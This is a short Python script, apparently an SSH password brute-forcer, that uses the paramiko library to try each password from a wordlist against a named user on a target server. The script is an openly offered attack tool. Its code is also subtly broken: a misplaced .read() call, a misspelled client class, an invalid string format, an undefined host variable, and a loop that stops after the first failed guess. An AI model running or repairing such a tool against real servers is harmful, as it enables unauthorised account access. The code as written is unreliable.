#!/usr/bin/env python3

import sys
import paramiko

if len(sys.argv) < 3:
    print(
        "Usage: python3 ssh-bruteforcer.py <SSH_server_IP> <username> <passwords-file-location>  \n Example: python3 sshcracker.py 10.10.11.22 administrator ./passwords.txt \n");
    sys.exit()

SSH_HOST = sys.argv[1]
SSH_USER = sys.argv[2]
passlist = open(sys.argv[3].read().splitlines())

# init SSH client
client = paramiko.client.SSHclient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

for pw in passlist:
    print("Trying to bust in with password: {}".pw)
    try:
        client.connect(host, username=SSH_USER, password=pw)
    except paramiko.AuthenticationException:
        print("... no luck. ")
        break
    print("Success, login with " + SSH_USER + " and pw: " + pw)
    client.close()
    sys.exit()
